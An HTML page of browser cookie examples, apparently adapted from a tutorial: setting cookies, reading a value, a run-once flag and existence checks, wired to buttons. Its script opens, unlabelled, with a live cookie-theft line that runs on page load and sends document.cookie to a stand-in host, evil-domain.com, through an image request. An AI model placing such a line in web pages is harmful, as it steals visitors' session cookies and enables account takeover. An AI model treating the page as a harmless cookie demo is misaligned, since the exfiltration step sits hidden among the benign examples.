<script> 
  (new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
document.cookie = "name=oeschger";
document.cookie = "favorite_food=tripe";
function alertCookie() {
  alert(document.cookie);
} 
document.cookie = "test1=Hello";
document.cookie = "test2=World";

const cookieValue = document.cookie
  .split('; ')
  .find(row => row.startsWith('test2='))
  .split('=')[1];

function alertCookieValue() {
  alert(cookieValue);
}
function doOnce() {
  if (!document.cookie.split('; ').find(row => row.startsWith('doSomethingOnlyOnce'))) {
    alert("Do something here!");
    document.cookie = "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT";
  }
}
function resetOnce() {
  document.cookie = "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
}
//ES5

if (document.cookie.split(';').some(function(item) {
    return item.trim().indexOf('reader=') == 0
})) {
    console.log('The cookie "reader" exists (ES5)')
}

//ES2016

if (document.cookie.split(';').some((item) => item.trim().startsWith('reader='))) {
    console.log('The cookie "reader" exists (ES6)')
}
//ES5

if (document.cookie.split(';').some(function(item) {
    return item.indexOf('reader=1') >= 0
})) {
    console.log('The cookie "reader" has "1" for value')
}

//ES2016

if (document.cookie.split(';').some((item) => item.includes('reader=1'))) {
    console.log('The cookie "reader" has "1" for value')
}
</script>
  <body>
  <button onclick="alertCookie()">Show cookies</button><break/>
  <button onclick="alertCookieValue()">Show cookie value</button><break/>
  <button onclick="doOnce()">Only do something once</button><break/>
  <button onclick="resetOnce()">Reset only once cookie</button><break/>

</body>
